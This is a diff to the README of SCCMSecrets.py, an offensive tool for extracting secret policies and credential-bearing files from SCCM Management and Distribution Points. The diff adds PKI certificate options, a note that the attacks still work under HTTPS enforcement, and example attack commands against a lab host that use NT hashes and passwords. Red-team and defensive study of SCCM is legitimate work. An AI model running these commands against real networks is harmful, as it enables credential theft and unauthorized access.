@@ -19,25 +19,33 @@ Output will be placed in a subdirectory of the `loot` directory (format: `[times
 
 ```
 $ python3 SCCMSecrets.py policies --help
-                                                                                                                                                                                                                                                                                          
- Usage: SCCMSecrets.py policies [OPTIONS]                                                                                                                                                                                                                                                 
-                                                                                                                                                                                                                                                                                          
- Dump secret policies from an SCCM Management Point                                                                                                                                                                                                                                       
-                                                                                                                                                                                                                                                                                          
-╭─ Options ──────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────╮
-│ *  --management-point     -mp      TEXT     The client's SCCM management point. Only necessary if the management point is not on the same machine as the distribution point [default: None] [required]                                                                                 │
-│ *  --client-name          -cn      TEXT     [Optional] The name of the client that will be created in SCCM - or a random name if using an existing device [default: None] [required]                                                                                                   │
-│    --machine-name         -u       TEXT     [Optional] A machine account name. If not provided, SCCMSecrets will try to exploit automatic device approval [default: None]                                                                                                              │
-│    --machine-pass         -p       TEXT     [Optional] The password for the machine account [default: None]                                                                                                                                                                            │
-│    --machine-hash         -H       TEXT     [Optional] The NT hash for the machine account [default: None]                                                                                                                                                                             │
-│    --registration-sleep   -rs      INTEGER  [Optional] The amount of time, in seconds, that should be waited after registrating a new device. A few minutes is recommended so that the new device can be added to device collections (3 minutes by default, may need to be increased)  │
-│                                             [default: 180]                                                                                                                                                                                                                             │
-│    --use-existing-device  -d       TEXT     [Optional] This option can be used to re-run SCCMSecrets.py using a previously registered device ; or to impersonate a legitimate SCCM client. In both cases, it expects the path of a folder containing a guid.txt file (the SCCM device  │
-│                                             GUID) and the key.pem file (the client's private key). Note that a client-name value must also be provided to SCCMSecrets (but does not have to match the one of the existing device)                                                      │
-│                                             [default: None]                                                                                                                                                                                                                            │
-│    --verbose              -v                [Optional] Enable verbose output                                                                                                                                                                                                           │
-│    --help                 -h                Show this message and exit.                                                                                                                                                                                                                │
-╰────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────╯
+                                                                                                                                                                                        
+ Usage: SCCMSecrets.py policies [OPTIONS]                                                                                                                                               
+                                                                                                                                                                                        
+ Dump secret policies from an SCCM Management Point                                                                                                                                     
+                                                                                                                                                                                        
+╭─ Options ────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────╮
+│ *  --management-point     -mp      TEXT     The client's SCCM management point. Expects either a URL, or a hostname/IP (defaults to HTTP in the latter case) [default: None]         │
+│                                             [required]                                                                                                                               │
+│ *  --client-name          -cn      TEXT     [Optional] The name of the client that will be created in SCCM - or a random name if using an existing device [default: None] [required] │
+│    --machine-name         -u       TEXT     [Optional] A machine account name. If not provided, SCCMSecrets will try to exploit automatic device approval [default: None]            │
+│    --machine-pass         -p       TEXT     [Optional] The password for the machine account [default: None]                                                                          │
+│    --machine-hash         -H       TEXT     [Optional] The NT hash for the machine account [default: None]                                                                           │
+│    --registration-sleep   -rs      INTEGER  [Optional] The amount of time, in seconds, that should be waited after registrating a new device. A few minutes is recommended so that   │
+│                                             the new device can be added to device collections (3 minutes by default, may need to be increased)                                       │
+│                                             [default: 180]                                                                                                                           │
+│    --use-existing-device  -d       TEXT     [Optional] This option can be used to re-run SCCMSecrets.py using a previously registered device ; or to impersonate a legitimate SCCM   │
+│                                             client. In both cases, it expects the path of a folder containing a guid.txt file (the SCCM device GUID) and the key.pem file (the       │
+│                                             client's private key). Note that a client-name value must also be provided to SCCMSecrets (but does not have to match the one of the     │
+│                                             existing device)                                                                                                                         │
+│                                             [default: None]                                                                                                                          │
+│    --pki-cert             -c       TEXT     [Optional] The path to a valid domain PKI certificate in PEM format. Required when the Management Point enforces HTTPS and thus client   │
+│                                             certificate authentication                                                                                                               │
+│                                             [default: None]                                                                                                                          │
+│    --pki-key              -k       TEXT     [Optional] The path to the private key of the certificate in PEM format [default: None]                                                  │
+│    --verbose              -v                [Optional] Enable verbose output                                                                                                         │
+│    --help                 -h                Show this message and exit.                                                                                                              │
+╰──────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────╯
 ```
 
 
@@ -52,25 +60,38 @@ Output will be placed in a subdirectory of the `loot` directory (format: `[times
 
 ```
 $ python3 SCCMSecrets.py files --help
-                                                                                                                                                                                                                                                                                          
- Usage: SCCMSecrets.py files [OPTIONS]                                                                                                                                                                                                                                                    
-                                                                                                                                                                                                                                                                                          
- Dump interesting files from an SCCM Distribution Point                                                                                                                                                                                                                                   
-                                                                                                                                                                                                                                                                                          
-╭─ Options ──────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────╮
-│ *  --distribution-point  -dp      TEXT     An SCCM distribution point [default: None] [required]                                                                                                                                                                                       │
-│    --username            -u       TEXT     [Optional] A username for a domain account. If no account is provided, SCCMSecrets will try to exploit anonymous DP access [default: None]                                                                                                  │
-│    --password            -p       TEXT     [Optional] The password for the domain account [default: None]                                                                                                                                                                              │
-│    --hash                -H       TEXT     [Optional] The NT hash for the domain account (e.g. A4F49C406510BDCAB6824EE7C30FD852) [default: None]                                                                                                                                       │
-│    --extensions          -e       TEXT     [Optional] Comma-separated list of extension that will determine which files will be downloaded when retrieving packages scripts. Provide an empty string to not download anything, and only index files                                    │
-│                                            [default: .ps1, .bat, .xml, .txt, .pfx]                                                                                                                                                                                                     │
-│    --urls                -f       TEXT     [Optional] A file containing a list of URLs (one per line) that should be downloaded from the Distribution Point. This is useful if you already indexed files and do not want to download by extension, but rather specific known files     │
-│                                            [default: None]                                                                                                                                                                                                                             │
-│    --max-recursion       -r       INTEGER  [Optional] The maximum recursion depth when indexing files from the Distribution Point [default: 10]                                                                                                                                        │
-│    --verbose             -v                [Optional] Enable verbose output                                                                                                                                                                                                            │
-│    --help                -h                Show this message and exit.                                                                                                                                                                                                                 │
-╰────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────╯
+                                                                                                                                                                                        
+ Usage: SCCMSecrets.py files [OPTIONS]                                                                                                                                                  
+                                                                                                                                                                                        
+ Dump interesting files from an SCCM Distribution Point                                                                                                                                 
+                                                                                                                                                                                        
+╭─ Options ────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────╮
+│ *  --distribution-point  -dp      TEXT     An SCCM distribution point. Expects either a URL, or a hostname/IP (defaults to HTTP in the latter case) [default: None] [required]       │
+│    --username            -u       TEXT     [Optional] A username for a domain account. If no account is provided, SCCMSecrets will try to exploit anonymous DP access                │
+│                                            [default: None]                                                                                                                           │
+│    --password            -p       TEXT     [Optional] The password for the domain account [default: None]                                                                            │
+│    --hash                -H       TEXT     [Optional] The NT hash for the domain account (e.g. A4F49C406510BDCAB6824EE7C30FD852) [default: None]                                     │
+│    --extensions          -e       TEXT     [Optional] Comma-separated list of extension that will determine which files will be downloaded when retrieving packages scripts. Provide │
+│                                            an empty string to not download anything, and only index files                                                                            │
+│                                            [default: .ps1, .bat, .xml, .txt, .pfx]                                                                                                   │
+│    --urls                -f       TEXT     [Optional] A file containing a list of URLs (one per line) that should be downloaded from the Distribution Point. This is useful if you   │
+│                                            already indexed files and do not want to download by extension, but rather specific known files                                           │
+│                                            [default: None]                                                                                                                           │
+│    --max-recursion       -r       INTEGER  [Optional] The maximum recursion depth when indexing files from the Distribution Point [default: 10]                                      │
+│    --pki-cert            -c       TEXT     [Optional] The path to a valid domain PKI certificate in PEM format. Required when the Distribution Point enforces HTTPS and thus client  │
+│                                            certificate authentication                                                                                                                │
+│                                            [default: None]                                                                                                                           │
+│    --pki-key             -k       TEXT     [Optional] The path to the private key of the certificate in PEM format [default: None]                                                   │
+│    --verbose             -v                [Optional] Enable verbose output                                                                                                          │
+│    --help                -h                Show this message and exit.                                                                                                               │
+╰──────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────╯
 ```
+
+## About HTTPS enforcement
+
+By default, clients can interact with their Management Point or Distribution Point using plain HTTP. The SCCM installation may however be configured more securely by enforcing the use of HTTPS. When this is the case (for either the Management Point, the Distribution Point, or both), SCCM will require client certificate authentication using an internal PKI certificate with the "client authentication" purpose.
+
+It is still possible to carry out the attacks presented above - however, a valid PKI certificate must be provided through the `--pki-cert` and `--pki-key` flags (PEM format). The Management Point / Distribution Point URLs should also be prefixed by `https://`.
 
 
 
@@ -106,15 +127,20 @@ Retrieve secret policies of an already existing device. The `compromised_device`
 $ python3 SCCMSecrets.py policies -mp http://mecm.sccm.lab --use-existing-device compromised_device/
 ```
 
+Retrieve secret policies when the Management Point enforces HTTPS
+```
+$ python3 SCCMSecrets.py policies -mp https://mecm.sccm.lab -u 'azule$' -H '2B576ACBE6BCFDA7294D6BD18041B8FE' -cn 'test' --pki-cert ./cert.pem --pki-key ./key.pem
+```
+
 
 ### Files
 
-Retrieve Distribution point files without providing credentials. This will attempt to exploit anonymous DP access (non-default configuration)
+Retrieve Distribution Point files without providing credentials. This will attempt to exploit anonymous DP access (non-default configuration)
 ```
 $ python3 SCCMSecrets files -dp http://mecm.sccm.lab
 ```
 
-Retrieve Distribution point files with credentials. This will work in default SCCM configurations
+Retrieve Distribution Point files with credentials. This will work in default SCCM configurations
 ```
 $ python3 SCCMSecrets.py files -dp http://mecm.sccm.lab -u 'dave' -p 'dragon'
 ```
@@ -126,5 +152,10 @@ $ python3 SCCMSecrets.py files -dp http://mecm.sccm.lab -u 'dave' -H 'F7EB9C06FA
 
 Retrieve specific files from the Distribution Point by providing a list of URLs (1 by line)
 ```
-python3 SCCMSecrets.py files -dp http://mecm.sccm.lab -u 'dave' -p 'dragon' --urls to_download.lst
+$ python3 SCCMSecrets.py files -dp http://mecm.sccm.lab -u 'dave' -p 'dragon' --urls to_download.lst
+```
+
+Retrieve DP files when the Distribution Point enforces HTTPS
+```
+$ python3 SCCMSecrets.py files -dp https://mecm.sccm.lab -u 'dave' -p 'dragon' --pki-cert ./cert.pem --pki-key ./key.pem
 ```
